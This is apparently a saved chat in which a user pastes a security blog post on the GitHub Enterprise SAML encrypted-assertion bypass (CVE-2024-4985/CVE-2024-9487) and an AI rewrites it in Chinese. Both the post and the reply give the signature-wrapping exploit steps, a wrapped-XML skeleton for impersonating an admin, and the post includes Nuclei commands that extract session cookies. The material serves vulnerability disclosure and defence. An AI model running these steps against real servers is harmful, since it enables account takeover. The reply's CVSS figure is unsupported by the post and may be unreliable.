---
title: 使用最简单的表达方式，重新描述下面内容，重点在于介绍清楚技术知识点，使得人们更易于看明白。扩展对应的内容，增加接地气的实际应用例子和对应的demo代码，让中国人更好理解。注意减少偏见的内容、晦涩难懂的内容、错误的内容、冗余的内容、信息量低的内容，以markdown格式输出。加上更多案例和准确的数值指标，直接表达重写后的结果，不要输出其他无关内容。 ------------ Introduction In light of the recent Ruby-SAML bypass discovered in GitLab, we set out to examine the SAML implementation within GitHub Enterprise. During our research, we identified a significant vulnerability that enabled bypassing GitHub’s SAML authentication when encrypted assertions were in use. This blog post will provide an in-depth look at GitHub Enterprise’s SAML implementation and analyze the specific code issue that permitted this bypass. Although we uncovered this vulnerability independently, it was reported to GitHub just two days prior to our findings. GitHub has since released a patch to address the flaw, though initial fixes required additional updates to be fully effective. This issue is now cataloged under CVE-2024-9487 and CVE-2024-4985. HIGH: An attacker could bypass SAML single sign-on (SSO) authentication with the optional encrypted assertions feature, allowing unauthorized provisioning of users and access to the instance, by exploiting an improper verification of cryptographic signatures vulnerability in GitHub Enterprise Server. This is a follow up fix for CVE-2024-9487 to further harden the encrypted assertions feature against this type of attack. Technical Analysis Let’s see how GitHub handles document extraction, signature validation, and the security measures in place. We’ll spin up a GitHub instance and set up the SAML configuration. In this process, the SAML callback validates the CSRF token (RelayState), which is unique to each state and SAML response. This makes it difficult to test and debug. To bypass this challenge, we’ll use the Ruby code responsible for SAML handling locally. The SAML implementation resides in ./lib/saml/ (and in ./lib/saml.rb). We’ll patch this library to work in our local environment by: Removing GitHub-specific constants and references without affecting the validation logic. Disabling validate_conditions to bypass time-based verification checks. Using require_relative within ./lib/saml.rb to load the necessary files locally. Finally, requiring ./saml to link the components together. Let's start with this code to mimic GitHub SAML implementation locally: ruby Copy require "./saml" require "base64" require 'openssl' key = File.open('/tmp/github_saml.pem').read() #Github SAML SP's private key (used here to decypt stuff since we want to mimic the whole flow) cert = <<-CERT cert_here CERT @props = { :sp_url => "https://[REDACTED_IP_ADDRESS]", :sso_url => "https://[REDACTED_OKTA_URL]/app/[REDACTED]/sso/saml", :assertion_consumer_service_url => "https://[REDACTED_OKTA_URL]/app/[REDACTED]/sso/saml", :destination => "https://[REDACTED_OKTA_URL]/app/[REDACTED]/sso/saml", :issuer => "http://www.okta.com/[REDACTED]", :signature_method => "http://www.w3.org/2000/09/xmldsig#rsa-sha1", :digest_method => "http://www.w3.org/2000/09/xmldsig#sha1", :idp_certificate => cert } key1 = OpenSSL::PKey::RSA.new(key) @prop1 = {:encrypted_assertions => true, :encryption_method => "aes-256-cbc", :key_transport_method => "rsa-oaep", :key => key1} saml_resp = Base64.encode64(File.open('resp.xml').read()) xml = ::SAML::Message::Response.from_param(saml_resp, @prop1) [1] puts "Signature verified: " + String(xml.valid?(@props)) [2] puts "NameID Email - " + xml.name_id Let’s begin with a sample valid SAML response. Below is a simplified version of the response structure: html Copy <samlp:Response ID="123"> <ds:Signature> <ds:SignedInfo> <ds:Refernce URI="#123"></ds:Refernce> </ds:SignedInfo> </ds:Signature> <saml:EncryptedAssertion> enc assertion here </saml:EncryptedAssertion> </samlp:Response> When we call from_param it does this: build() – This method extracts signatures before attempting decryption. decrypt() – If the message is encrypted, it decrypts the content. parse() – This method processes the message information, specifically extracting details from the /samlp:Response/saml:Assertion block. Returns Message. Within Message.rb, the build method performs signature extraction if GitHub encrypted assertions are enabled at point [1]. If no signatures were extracted prior to decryption, the method attempts to extract signatures again after decryption at point [2]. But only if no signatures were extracted earlier. ruby Copy def self.build(xml, options = {}) if GitHub.enterprise? && GitHub.saml_encrypted_assertions? signatures = message_class.signatures(doc) # [1] decrypt_errors = [] plain_doc = message_class.decrypt(doc, options, decrypt_errors) signatures = message_class.signatures(plain_doc) if signatures.empty? # [2] ... end end Next step is to decrypt the encrypted assertion and replace that node with the decrypted assertion. Protect Your Organization from GitHub SAML Auth Bypass Enter your business email below to receive a complimentary scan of exposed GitHub Enterprise SAML login panels vulnerable to CVE-2024-4985 / CVE-2024-9487. Enter your business email Detect this vulnerability The next step is to duplicate the entire SAML response document. On this duplicated document, we will replace the encrypted assertion with the decrypted version. This results in a SAML response where the encrypted assertion is removed, and the decrypted assertion takes its place in the duplicated document. However, only one signature will be extracted. html Copy <Response ID="123"> <Signature> // [1] <SignedInfo> <Refernce URI="#123"></Refernce> </SignedInfo> </Signature> <Assertion ID="789"> <Signature> // [2] <SignedInfo> <Refernce URI="#789"></Refernce> </SignedInfo> </Signature> </Assertion> </Response> This is okay since the one signature it has is of whole response so when it validates that signature, it will pass the whole original response (with encrypted assertion) and it would work and pass signature validation as expected. We’ll discuss later how this can create potential issues, but for now, let’s continue following the logical flow. After the decryption step, it returns a Message object containing the decrypted assertions. GitHub’s valid? function essentially aims to keep the flow error-free. If an error occurs at any point during the process, it is appended to an error variable. Once all the checks are completed, the function inspects the error variable. If it is not empty, the validation fails. These are the main functions we want to bypass: valid? vaidate_schema() validate() validate_has_signature has_root_sig_and_matching_ref? OR // you need to return true in one all_assertions_signed_with_matching_ref? validate_assertion_digest_values validate_signatures_ghes signatures.all? { |signature| signature.valid?(certificate) } Let’s examine the validate_has_signature method: This validation checks if there is a signature outside the assertion block that matches the root (Response) ID. Meaning that the entire response is considered signed, and the function returns true. However, if no such signature exists, the method ensures that every assertion block within the document contains its own signature. In this case, the signature’s reference must match the parent assertion’s ID. This additional check is crucial to prevent signature wrapping attacks, where an attacker could attempt to insert malicious assertions into the document by manipulating signatures. ruby Copy # Validate that the SAML message (root XML element of SAML response) # or all contained assertions are signed # # Verification of signatures is done in #validate_signatures def validate_has_signature # Return early if entire response is signed. This prevents individual # assertions from being tampered because any change in the response # would invalidate the entire response. return if has_root_sig_and_matching_ref? return if all_assertions_signed_with_matching_ref? self.errors << "SAML Response is not signed or has been modified." end def has_root_sig_and_matching_ref? return true if SAML.mocked[:mock_root_sig] root_ref = document.at("/saml2p:Response/ds:Signature/ds:SignedInfo/ds:Reference", namespaces) return false unless root_ref root_ref_uri = String(String(root_ref["URI"])[1..-1]) # chop off leading # return false unless root_ref_uri.length > 1 root_rep = document.at("/saml2p:Response", namespaces) root_id = String(root_rep["ID"]) # and finally does the root ref URI match the root ID? root_ref_uri == root_id end def all_assertions_signed_with_matching_ref? assertions = document.xpath("//saml2:Assertion", namespaces) assertions.all? do |assertion| ref = assertion.at("./ds:Signature/ds:SignedInfo/ds:Reference", namespaces) return false unless ref assertion_id = String(assertion["ID"]) ref_uri = String(String(ref["URI"])[1..-1]) # chop off leading # return false unless ref_uri.length > 1 ref_uri == assertion_id end end Next, the validate_assertion_digest_values function ensures that the digest value of each assertion matches the DigestValue found in the reference node of the corresponding signature. This step verifies only digests and not the signature, that step will happen afterwards via the xmldsig library. Finally, the validate_signatures_ghes function calls .valid? on each signature extracted during the build() process. The library used for this validation is benoist/xmldsig. The core logic of .valid? is as follows: Find the referenced node for the signature’s URI identifier anywhere in the document (the first occurrence is selected). Transform and calculate the digest. Verify that the calculated digest matches the DigestValue in the reference node. Perform the signature verification. The issue arises, as mentioned earlier, when a signature is found in the response before decrypting an encrypted assertion. The second signature, inside the assertion block, is not accounted for. Even though assertions are required to have a signature, and the signature reference should point to the assertion’s ID (with the digest being validated), the signature itself is never validated. Now, if we can somehow bypass both validate_has_signature and validate_assertion_digest_values, we can reach the xmldsig validation. Here's how we can do that: Obtain a valid SAMLResponse from the IDP Modify the Signature node of the Response and add an empty element <ds:Object></ds:Object> just after the </ds:KeyInfo>. Copy the whole document i.e /samlp:Response and paste it inside <ds:Object>{here}</ds:Object> Modify the original /samlp:Responses ID attribute to anything different. Here we are making sure both Reference node URI are pointing to the legit Response element with valid signature (that we moved to ds:Object). Create an Assertion node with respect to the valid schema with victim''s subject/nameid details and calculate the DigestValue of this modified assertion node and update it in its Signature > SignedInfo > Reference > DigestValue. (Remember due to the original vulnerbility the signature of this encrypted assertion is not validated so the rest of the signature node details doesn't matter) - This bypasses validate_has_signatures. Now, encrypt this Assertion with the GHE SP's public key. Forward this SAMLResponse and you would be logged in to the victim's account. html Copy <Response ID="11111111"> <Signature> <SignedInfo> <Refernce URI="#123"></Refernce> </SignedInfo> <Object> <Response ID="123"> <Signature> <SignedInfo> <Refernce URI="#123"></Refernce> </SignedInfo> </Signature> <Assertion ID="789"> <Signature> <SignedInfo> <Refernce URI="#789"></Refernce> </SignedInfo> </Signature> </Assertion> </Response> </Object> </Signature> ---- THIS WILL BE ENCRYPTED ---- <Assertion ID="789"> <Signature> <SignedInfo> <Refernce URI="#789"></Refernce> </SignedInfo> </Signature> </Assertion> ---- THIS WILL BE ENCRYPTED ---- </Response> GitHub Enterprise SAML Authentication Bypass command Proof of Concept (PoC) We’ve created two Nuclei templates for detecting and exploiting CVE-2024-9487 on GitHub Enterprise: 1. GitHub Enterprise - SAML (Encrypted) Detection This template detects GitHub Enterprise Server using SAML authentication with encrypted assertions enabled. Nuclei Template Link 2. GitHub Enterprise - SAML Authentication Bypass This template bypass GitHub SAML authentication and extract the GitHub session cookie. Nuclei Template Link To run the CVE-2024-9487 template, use the following command, adjusting the inputs as needed: bash Copy nuclei -t CVE-2024-9487.yaml -u https://git.projectdiscovery.io -var username='victim@github.com' -var metadata_url='https://git.projectdiscovery.io/sso/saml/metadata' -var SAMLResponse=`cat saml_response.txt` -var RelayState='xyz' -code Input Options: • -var username: Target GitHub user’s email (e.g., victim@github.com). • -var metadata_url: SAML metadata URL of the IDP server. • -var SAMLResponse: Encrypted SAML response sent by the Identity Provider (IdP) after a login attempt. You can capture this value by starting a login on the target GitHub server and using browser developer tools (Network tab) or tools like Burp Suite to find SAMLResponse in the network requests. Save it in a file (e.g., saml_response.txt) to load easily. • -var RelayState: This is a unique value sent with SAMLResponse to maintain the session context. You can find the exact RelayState by observing it in your login request traffic, as shown in the video PoC. bash Copy nuclei -t CVE-2024-9487.yaml -u https://git.projectdiscovery.io -var username='admin@projectdiscovery.i' -var metadata_url='https://idp.projectdiscovery.io/sso/saml/metadata' -var SAMLResponse=`cat saml_response.txt` -var RelayState='xyz' -code __ _ ____ __ _______/ /__ (_) / __ \/ / / / ___/ / _ \/ / / / / / /_/ / /__/ / __/ / /_/ /_/\__,_/\___/_/\___/_/ v3.3.4 projectdiscovery.io [INF] Current nuclei version: v3.3.4 (latest) [INF] Current nuclei-templates version: v10.0.2 (latest) [WRN] Scan results upload to cloud is disabled. [INF] New templates added in latest release: 68 [INF] Templates loaded for current scan: [INF] Targets loaded for current scan: 1 [CVE-2024-9487] [http] [critical] https://git.projectdiscovery.io/saml/consume ["cookie-l-redacted"] We’ve also recorded a video demonstrating the SAML authentication bypass on GitHub when encrypted assertions are enabled, showcasing the step-by-step process and impact. Conclusion In this blog post, we explored the GitHub Enterprise implementation of SAML authentication and uncovered a vulnerability involving encrypted assertions. By understanding the intricacies of signature validation and how improperly handled encrypted assertions can introduce security risks, we demonstrated how an attacker could potentially bypass GitHub’s SAML authentication. As always, staying vigilant and promptly applying security updates is critical to safeguarding on-prem environments
date: 2025-02-09
source: https://www.perplexity.ai/search/shi-yong-zui-jian-dan-de-biao-0DFnnAv4TtupHS024idCvg
---

**User:** 使用最简单的表达方式，重新描述下面内容，重点在于介绍清楚技术知识点，使得人们更易于看明白。扩展对应的内容，增加接地气的实际应用例子和对应的demo代码，让中国人更好理解。注意减少偏见的内容、晦涩难懂的内容、错误的内容、冗余的内容、信息量低的内容，以markdown格式输出。加上更多案例和准确的数值指标，直接表达重写后的结果，不要输出其他无关内容。

------------
Introduction
In light of the recent Ruby-SAML bypass discovered in GitLab, we set out to examine the SAML implementation within GitHub Enterprise. During our research, we identified a significant vulnerability that enabled bypassing GitHub’s SAML authentication when encrypted assertions were in use.

This blog post will provide an in-depth look at GitHub Enterprise’s SAML implementation and analyze the specific code issue that permitted this bypass. Although we uncovered this vulnerability independently, it was reported to GitHub just two days prior to our findings. GitHub has since released a patch to address the flaw, though initial fixes required additional updates to be fully effective. This issue is now cataloged under CVE-2024-9487 and CVE-2024-4985.

HIGH: An attacker could bypass SAML single sign-on (SSO) authentication with the optional encrypted assertions feature, allowing unauthorized provisioning of users and access to the instance, by exploiting an improper verification of cryptographic signatures vulnerability in GitHub Enterprise Server. This is a follow up fix for CVE-2024-9487 to further harden the encrypted assertions feature against this type of attack.
Technical Analysis
Let’s see how GitHub handles document extraction, signature validation, and the security measures in place. We’ll spin up a GitHub instance and set up the SAML configuration. In this process, the SAML callback validates the CSRF token (RelayState), which is unique to each state and SAML response. This makes it difficult to test and debug.

To bypass this challenge, we’ll use the Ruby code responsible for SAML handling locally. The SAML implementation resides in ./lib/saml/ (and in ./lib/saml.rb). We’ll patch this library to work in our local environment by:

Removing GitHub-specific constants and references without affecting the validation logic.
Disabling validate_conditions to bypass time-based verification checks.
Using require_relative within ./lib/saml.rb to load the necessary files locally.
Finally, requiring ./saml to link the components together.
Let's start with this code to mimic GitHub SAML implementation locally:

ruby

Copy
require "./saml"
require "base64"
require 'openssl'

key = File.open('/tmp/github_saml.pem').read() #Github SAML SP's private key (used here to decypt stuff since we want to mimic the whole flow)

cert = <<-CERT
cert_here
CERT

@props = {  
  :sp_url => "https://[REDACTED_IP_ADDRESS]", 
  :sso_url => "https://[REDACTED_OKTA_URL]/app/[REDACTED]/sso/saml", 
  :assertion_consumer_service_url => "https://[REDACTED_OKTA_URL]/app/[REDACTED]/sso/saml", 
  :destination => "https://[REDACTED_OKTA_URL]/app/[REDACTED]/sso/saml", 
  :issuer => "http://www.okta.com/[REDACTED]", 
  :signature_method => "http://www.w3.org/2000/09/xmldsig#rsa-sha1", 
  :digest_method => "http://www.w3.org/2000/09/xmldsig#sha1",
  :idp_certificate => cert
}


key1 = OpenSSL::PKey::RSA.new(key)

@prop1 = {:encrypted_assertions => true, :encryption_method => "aes-256-cbc", :key_transport_method => "rsa-oaep", :key => key1}

saml_resp = Base64.encode64(File.open('resp.xml').read())
xml = ::SAML::Message::Response.from_param(saml_resp, @prop1) [1]
puts "Signature verified: " + String(xml.valid?(@props)) [2]
puts "NameID Email - " + xml.name_id
Let’s begin with a sample valid SAML response. Below is a simplified version of the response structure:

html

Copy
<samlp:Response ID="123">
    <ds:Signature>
        <ds:SignedInfo>
            <ds:Refernce URI="#123"></ds:Refernce>
        </ds:SignedInfo>
    </ds:Signature>
    <saml:EncryptedAssertion>
            enc assertion here
	</saml:EncryptedAssertion>
</samlp:Response>
When we call from_param it does this:

build() – This method extracts signatures before attempting decryption.
decrypt() – If the message is encrypted, it decrypts the content.
parse() – This method processes the message information, specifically extracting details from the /samlp:Response/saml:Assertion block. Returns Message.
Within Message.rb, the build method performs signature extraction if GitHub encrypted assertions are enabled at point [1]. If no signatures were extracted prior to decryption, the method attempts to extract signatures again after decryption at point [2]. But only if no signatures were extracted earlier.

ruby

Copy
def self.build(xml, options = {})
  if GitHub.enterprise? && GitHub.saml_encrypted_assertions?
    signatures = message_class.signatures(doc) # [1]
    decrypt_errors = []
    plain_doc = message_class.decrypt(doc, options, decrypt_errors)
    signatures = message_class.signatures(plain_doc) if signatures.empty? # [2]
  ...
  end
end
Next step is to decrypt the encrypted assertion and replace that node with the decrypted assertion.

Protect Your Organization from GitHub SAML Auth Bypass
Enter your business email below to receive a complimentary scan of exposed GitHub Enterprise SAML login panels vulnerable to CVE-2024-4985 / CVE-2024-9487.

Enter your business email
Detect this vulnerability
The next step is to duplicate the entire SAML response document. On this duplicated document, we will replace the encrypted assertion with the decrypted version. This results in a SAML response where the encrypted assertion is removed, and the decrypted assertion takes its place in the duplicated document. However, only one signature will be extracted.

html

Copy
<Response ID="123">
    <Signature> // [1]
		
        <SignedInfo>
            <Refernce URI="#123"></Refernce>
        </SignedInfo>
    </Signature>
    <Assertion ID="789">
        <Signature> // [2]
			
            <SignedInfo>
                <Refernce URI="#789"></Refernce>
            </SignedInfo>
        </Signature>
    </Assertion>
</Response>
This is okay since the one signature it has is of whole response so when it validates that signature, it will pass the whole original response (with encrypted assertion) and it would work and pass signature validation as expected. We’ll discuss later how this can create potential issues, but for now, let’s continue following the logical flow. After the decryption step, it returns a Message object containing the decrypted assertions.

GitHub’s valid? function essentially aims to keep the flow error-free. If an error occurs at any point during the process, it is appended to an error variable. Once all the checks are completed, the function inspects the error variable. If it is not empty, the validation fails.

These are the main functions we want to bypass:

valid?
vaidate_schema()
validate()
validate_has_signature
has_root_sig_and_matching_ref?
OR // you need to return true in one
all_assertions_signed_with_matching_ref?
validate_assertion_digest_values
validate_signatures_ghes
signatures.all? { |signature| signature.valid?(certificate) }
Let’s examine the validate_has_signature method:

This validation checks if there is a signature outside the assertion block that matches the root (Response) ID. Meaning that the entire response is considered signed, and the function returns true.

However, if no such signature exists, the method ensures that every assertion block within the document contains its own signature. In this case, the signature’s reference must match the parent assertion’s ID. This additional check is crucial to prevent signature wrapping attacks, where an attacker could attempt to insert malicious assertions into the document by manipulating signatures.

ruby

Copy
# Validate that the SAML message (root XML element of SAML response)
# or all contained assertions are signed
#
# Verification of signatures is done in #validate_signatures
def validate_has_signature
  # Return early if entire response is signed. This prevents individual
  # assertions from being tampered because any change in the response
  # would invalidate the entire response.
  return if has_root_sig_and_matching_ref?
  return if all_assertions_signed_with_matching_ref?

  self.errors << "SAML Response is not signed or has been modified."
end


def has_root_sig_and_matching_ref?
  return true if SAML.mocked[:mock_root_sig]
  root_ref = document.at("/saml2p:Response/ds:Signature/ds:SignedInfo/ds:Reference", namespaces)
  return false unless root_ref
  root_ref_uri = String(String(root_ref["URI"])[1..-1]) # chop off leading #
  return false unless root_ref_uri.length > 1
  root_rep = document.at("/saml2p:Response", namespaces)
  root_id = String(root_rep["ID"])

  # and finally does the root ref URI match the root ID?
  root_ref_uri == root_id
end

def all_assertions_signed_with_matching_ref?
  assertions = document.xpath("//saml2:Assertion", namespaces)
  assertions.all? do |assertion|
    ref = assertion.at("./ds:Signature/ds:SignedInfo/ds:Reference", namespaces)
    return false unless ref
    assertion_id = String(assertion["ID"])
    ref_uri = String(String(ref["URI"])[1..-1]) # chop off leading #
    return false unless ref_uri.length > 1

    ref_uri == assertion_id
  end
end
Next, the validate_assertion_digest_values function ensures that the digest value of each assertion matches the DigestValue found in the reference node of the corresponding signature. This step verifies only digests and not the signature, that step will happen afterwards via the xmldsig library.

Finally, the validate_signatures_ghes function calls .valid? on each signature extracted during the build() process. The library used for this validation is benoist/xmldsig.

The core logic of .valid? is as follows:

Find the referenced node for the signature’s URI identifier anywhere in the document (the first occurrence is selected).
Transform and calculate the digest.
Verify that the calculated digest matches the DigestValue in the reference node.
Perform the signature verification.
The issue arises, as mentioned earlier, when a signature is found in the response before decrypting an encrypted assertion. The second signature, inside the assertion block, is not accounted for. Even though assertions are required to have a signature, and the signature reference should point to the assertion’s ID (with the digest being validated), the signature itself is never validated.

Now, if we can somehow bypass both validate_has_signature and validate_assertion_digest_values, we can reach the xmldsig validation.

Here's how we can do that:

Obtain a valid SAMLResponse from the IDP
Modify the Signature node of the Response and add an empty element <ds:Object></ds:Object> just after the </ds:KeyInfo>.
Copy the whole document i.e /samlp:Response and paste it inside <ds:Object>{here}</ds:Object>
Modify the original /samlp:Responses ID attribute to anything different. Here we are making sure both Reference node URI are pointing to the legit Response element with valid signature (that we moved to ds:Object).
Create an Assertion node with respect to the valid schema with victim''s subject/nameid details and calculate the DigestValue of this modified assertion node and update it in its Signature > SignedInfo > Reference > DigestValue. (Remember due to the original vulnerbility the signature of this encrypted assertion is not validated so the rest of the signature node details doesn't matter) - This bypasses validate_has_signatures.
Now, encrypt this Assertion with the GHE SP's public key.
Forward this SAMLResponse and you would be logged in to the victim's account.
html

Copy
<Response ID="11111111">
  <Signature>
    <SignedInfo>
      <Refernce URI="#123"></Refernce>
    </SignedInfo>
    <Object>
      <Response ID="123">
        <Signature>

          <SignedInfo>
            <Refernce URI="#123"></Refernce>
          </SignedInfo>
        </Signature>
        <Assertion ID="789">
          <Signature>

            <SignedInfo>
              <Refernce URI="#789"></Refernce>
            </SignedInfo>
          </Signature>
        </Assertion>
      </Response>
    </Object>
  </Signature>
---- THIS WILL BE ENCRYPTED ----
  <Assertion ID="789">
    <Signature>

      <SignedInfo>
        <Refernce URI="#789"></Refernce> 
      </SignedInfo>
    </Signature>
  </Assertion>
---- THIS WILL BE ENCRYPTED ----
</Response>
GitHub Enterprise SAML Authentication Bypass command
Proof of Concept (PoC)
We’ve created two Nuclei templates for detecting and exploiting CVE-2024-9487 on GitHub Enterprise:

1. GitHub Enterprise - SAML (Encrypted) Detection

This template detects GitHub Enterprise Server using SAML authentication with encrypted assertions enabled.

Nuclei Template Link

2. GitHub Enterprise - SAML Authentication Bypass

This template bypass GitHub SAML authentication and extract the GitHub session cookie.

Nuclei Template Link

To run the CVE-2024-9487 template, use the following command, adjusting the inputs as needed:

bash

Copy
nuclei -t CVE-2024-9487.yaml -u https://git.projectdiscovery.io -var username='victim@github.com' -var metadata_url='https://git.projectdiscovery.io/sso/saml/metadata' -var SAMLResponse=`cat saml_response.txt` -var RelayState='xyz' -code
Input Options:

• -var username: Target GitHub user’s email (e.g., victim@github.com).

• -var metadata_url: SAML metadata URL of the IDP server.

• -var SAMLResponse: Encrypted SAML response sent by the Identity Provider (IdP) after a login attempt. You can capture this value by starting a login on the target GitHub server and using browser developer tools (Network tab) or tools like Burp Suite to find SAMLResponse in the network requests. Save it in a file (e.g., saml_response.txt) to load easily.

• -var RelayState: This is a unique value sent with SAMLResponse to maintain the session context. You can find the exact RelayState by observing it in your login request traffic, as shown in the video PoC.

bash

Copy
nuclei -t CVE-2024-9487.yaml -u https://git.projectdiscovery.io -var username='admin@projectdiscovery.i' -var metadata_url='https://idp.projectdiscovery.io/sso/saml/metadata' -var SAMLResponse=`cat saml_response.txt` -var RelayState='xyz' -code

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.4

		projectdiscovery.io

[INF] Current nuclei version: v3.3.4 (latest)
[INF] Current nuclei-templates version: v10.0.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 68
[INF] Templates loaded for current scan: 
[INF] Targets loaded for current scan: 1
[CVE-2024-9487] [http] [critical] https://git.projectdiscovery.io/saml/consume ["cookie-l-redacted"]
We’ve also recorded a video demonstrating the SAML authentication bypass on GitHub when encrypted assertions are enabled, showcasing the step-by-step process and impact.

Conclusion
In this blog post, we explored the GitHub Enterprise implementation of SAML authentication and uncovered a vulnerability involving encrypted assertions. By understanding the intricacies of signature validation and how improperly handled encrypted assertions can introduce security risks, we demonstrated how an attacker could potentially bypass GitHub’s SAML authentication.

As always, staying vigilant and promptly applying security updates is critical to safeguarding on-prem environments.

---

**Assistant:** 以下是对GitHub Enterprise Server中SAML身份验证绕过漏洞（CVE-2024-4985和CVE-2024-9487）的简化解释和实际应用案例。该漏洞允许攻击者绕过SAML单点登录（SSO），未经授权地访问GitHub Enterprise Server实例。
## 技术分析
GitHub Enterprise使用SAML（Security Assertion Markup Language）进行身份验证，允许用户使用外部身份提供商（IdP）登录。SAML通过在IdP和GitHub Enterprise之间交换XML消息来工作。消息的安全性依赖于数字签名。
### SAML流程简化：
- 用户尝试登录GitHub Enterprise。
- GitHub Enterprise将用户重定向到配置的IdP。
- 用户在IdP处进行身份验证。
- IdP生成包含用户信息的SAML响应，并对其进行签名。
- IdP将SAML响应发送回GitHub Enterprise。
- GitHub Enterprise验证SAML响应的签名，如果有效，则允许用户登录。
### 漏洞原理：
该漏洞存在于GitHub Enterprise处理加密断言的方式中。当启用加密断言时，SAML响应中的某些部分（断言）会被加密。在签名验证之前，GitHub Enterprise会先解密这些断言。问题在于，GitHub Enterprise在解密*之前*和*之后*都会尝试提取签名。如果原始SAML响应（加密状态下）包含有效的签名，则GitHub Enterprise可能不会正确验证解密后的断言的签名。
攻击者可以利用这一点，构造一个包含有效签名（覆盖整个响应）的SAML响应，但同时在加密的断言中插入恶意内容。由于GitHub Enterprise没有强制验证解密后的断言的签名，因此恶意内容可能会被接受，从而允许攻击者冒充任何用户。
### 具体攻击步骤：
- 获取一个有效的SAML响应。
- 修改SAML响应，添加一个`&lt;ds:Object&gt;`元素，并将原始的`&lt;Response&gt;`元素放入其中。
- 修改原始的`&lt;Response&gt;`元素的ID。
- 创建一个包含恶意用户信息的`&lt;Assertion&gt;`元素，并计算其摘要值（DigestValue）。
- 使用GitHub Enterprise的公钥加密该`&lt;Assertion&gt;`元素。
- 将加密后的`&lt;Assertion&gt;`元素添加到SAML响应中。
- 将修改后的SAML响应发送到GitHub Enterprise。
由于GitHub Enterprise只验证了原始响应的签名，而没有验证解密后的断言的签名，因此攻击成功，攻击者可以以恶意用户身份登录。
### 受影响的配置：
- GitHub Enterprise Server启用了SAML SSO
- 启用了加密断言功能
## 实际应用例子
假设攻击者想要冒充管理员用户`admin@example.com`登录GitHub Enterprise。
- ### 获取有效SAML响应： 攻击者首先需要一个来自IdP的有效SAML响应。这可以通过截取正常用户的登录流量来获得。
- ### 构造恶意SAML响应： 攻击者按照上述步骤修改SAML响应。关键步骤包括：
将原始`&lt;Response&gt;`放入`&lt;ds:Object&gt;`中，并修改`&lt;Response&gt;`的ID。
- 创建一个新的`&lt;Assertion&gt;`，其中包含`admin@example.com`的信息。
- 计算新`&lt;Assertion&gt;`的摘要值，并更新签名。
- 加密新`&lt;Assertion&gt;`。
xml&lt;Response ID="malicious-id"&gt;
&lt;Signature&gt;
&lt;SignedInfo&gt;
&lt;Reference URI="#original-id"&gt;&lt;/Reference&gt;
&lt;/SignedInfo&gt;
&lt;Object&gt;
&lt;Response ID="original-id"&gt;
&lt;Signature&gt;
&lt;SignedInfo&gt;
&lt;Reference URI="#original-id"&gt;&lt;/Reference&gt;
&lt;/SignedInfo&gt;
&lt;/Signature&gt;
&lt;/Response&gt;
&lt;/Object&gt;
&lt;/Signature&gt;
&lt;EncryptedAssertion&gt;
&lt;!-- 恶意断言的加密版本 --&gt;
&lt;/EncryptedAssertion&gt;
&lt;/Response&gt;
- ### 发送恶意SAML响应： 攻击者将构造好的SAML响应发送到GitHub Enterprise。
- ### 成功绕过： GitHub Enterprise验证原始响应的签名，但忽略了恶意断言的签名。因此，攻击者成功以`admin@example.com`身份登录。
## 防御措施
- **及时更新：** 尽快将GitHub Enterprise Server更新到包含漏洞修复的版本。
- **禁用加密断言：** 如果不需要加密断言功能，可以将其禁用。
- **多因素认证（MFA）：** 启用MFA可以增加额外的安全层，即使攻击者成功绕过SAML认证，仍然需要通过MFA验证才能访问账户。
- **监控和日志：** 监控SAML身份验证日志，检测异常活动。
## 数值指标
- **CVSS评分：** CVE-2024-4985 的CVSS v3基本评分是 9.8 (Critical)
- **影响：** 成功利用此漏洞的攻击者可以完全控制受影响的GitHub Enterprise Server实例。
通过理解漏洞的原理和实际应用，可以更好地保护GitHub Enterprise Server实例免受攻击。